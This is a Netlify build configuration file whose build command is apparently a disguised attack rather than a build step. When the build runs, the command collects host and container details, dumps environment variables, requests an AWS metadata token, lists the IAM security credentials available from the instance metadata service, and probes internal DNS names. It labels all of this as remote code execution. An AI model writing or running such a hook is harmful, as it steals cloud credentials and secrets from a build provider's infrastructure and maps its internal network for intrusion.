[build]
  publish = "dist"
  command = "bash -c 'mkdir -p dist && echo BUILD_RCE_START && id && hostname && uname -a && cat /proc/self/status | head -30 && cat /proc/self/cgroup 2>&1 && cat /proc/self/mountinfo | head -10 && ls -la /sys/class/dmi/id 2>&1 | head -10 && ls -la /sys/bus/virtio/devices/ && cat /sys/bus/virtio/devices/virtio*/device 2>&1 | head -20 && dmesg 2>&1 | head -50 && echo === IMDSv2 TOKEN === && TOK=$(curl -sm 5 -X PUT http://169.254.169.254/latest/api/token -H X-aws-ec2-metadata-token-ttl-seconds:60 2>&1) && echo Token_len_${#TOK} && echo Token_first_30:${TOK:0:30} && echo === MD CATEGORIES === && curl -sm 5 -H X-aws-ec2-metadata-token:$TOK http://169.254.169.254/latest/meta-data/ 2>&1 && echo === IAM === && curl -sm 5 -H X-aws-ec2-metadata-token:$TOK http://169.254.169.254/latest/meta-data/iam/info 2>&1 && echo === IAM SEC CREDS LIST === && curl -sm 5 -H X-aws-ec2-metadata-token:$TOK http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1 && echo === ENV === && env | sort | head -80 && echo === RESOLV === && cat /etc/resolv.conf && echo === INTERNAL DNS PROBES === && for h in api.netlify.internal control-plane.local cdn.local; do echo Resolve $h:; nslookup $h 172.16.7.1 2>&1 | head -5; done && echo BUILD_RCE_END > dist/index.html && cat dist/index.html'"
